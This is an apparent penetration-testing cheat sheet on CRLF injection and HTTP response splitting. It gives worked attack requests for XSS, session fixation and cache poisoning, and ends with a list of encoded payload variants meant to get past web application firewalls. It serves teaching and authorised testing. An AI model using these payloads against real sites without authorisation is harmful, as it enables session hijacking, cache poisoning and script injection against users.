CRLF Injection

CRLF injection (Carriage Return Line Feed — \r\n / %0d%0a) occurs when user-supplied input containing newline characters is included in HTTP response headers without sanitization. Since HTTP headers are delimited by CRLF sequences, injecting them allows an attacker to add arbitrary headers or split the response into two entirely separate HTTP messages — a technique called HTTP Response Splitting. This enables session fixation, cache poisoning, XSS, and open redirect attacks.

How It Works

# HTTP response headers are separated by \r\n:
HTTP/1.1 302 Found\r\n
Location: https://target.com/page\r\n
Set-Cookie: session=abc123\r\n
\r\n

# If a redirect URL is taken from user input without sanitization:
GET /redirect?url=https://target.com%0d%0aSet-Cookie:evil=injected HTTP/1.1

# Server produces:
HTTP/1.1 302 Found\r\n
Location: https://target.com\r\n
Set-Cookie: evil=injected\r\n    ← injected header
\r\n

# HTTP Response Splitting — inject a full second response:
# Inject: %0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a...
# The browser reads the first response (Content-Length: 0 = empty body),
# then parses the injected bytes as a second HTTP response

Attack: XSS via Response Splitting

# Classic response splitting → XSS:
# URL: http://target.com/page?url=VALUE
# Inject VALUE as:

http://www.example.com/page?url=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E

# Decoded, this injects:
# \r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 25\r\n\r\n

# How the browser sees it:
# Response 1: 302 redirect with Content-Length: 0 (empty body)
# Response 2: 200 OK with Content-Type: text/html and XSS payload

# The XSS payload (25 bytes exactly) is the only content parsed

Attack: Cookie Injection / Session Fixation

# Inject a Set-Cookie header to fix the victim's session:
GET /login?redirect=%0d%0aSet-Cookie:session=attacker_known_value HTTP/1.1

# Server responds:
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=attacker_known_value   ← injected

# If victim uses this session and logs in, attacker (who knows the session value)
# is now authenticated as the victim

# Also useful for:
# - Setting SameSite=None; Secure to enable cross-site cookie transmission
# - Overwriting HttpOnly cookies via duplicate Set-Cookie (some parsers)
# - Injecting X-Frame-Options: ALLOWALL to enable clickjacking

Attack: Cache Poisoning via CRLF

# CRLF + cache: inject a poisoned response that gets stored by a proxy/CDN
# Prerequisite: the URL with the injected parameter must be cacheable

GET /search?q=test%0d%0aX-Injected:%20poisoned HTTP/1.1

# If the proxy caches this response and serves it to other users:
# → all users querying /search?q=test get the injected header

# Combined with Response Splitting → inject full XSS response into cache

Payload List — Encoding Variants

# Standard CRLF:
%0d%0aSet-Cookie:crlf=injection
%0aSet-Cookie:crlf=injection
%0dSet-Cookie:crlf=injection

# URL double-encoding:
%250aSet-Cookie:crlf=injection
%25250aSet-Cookie:crlf=injection
%25%30aSet-Cookie:crlf=injection
%25%30%61Set-Cookie:crlf=injection

# Hash/question mark prefix (for WAF bypass):
/%23%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%3f%0aSet-Cookie:crlf=injection
/%3f%0dSet-Cookie:crlf=injection

# Other encodings:
/%u000aSet-Cookie:crlf=injection
/%%0a0aSet-Cookie:crlf=injection
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
/%2F..%0d%0aSet-Cookie:crlf=injection

# Generic header injection (test any header):
%0d%0aheader:header
%0aheader:header
/%250aheader:header
/%25250aheader:header
/%u000aheader:header
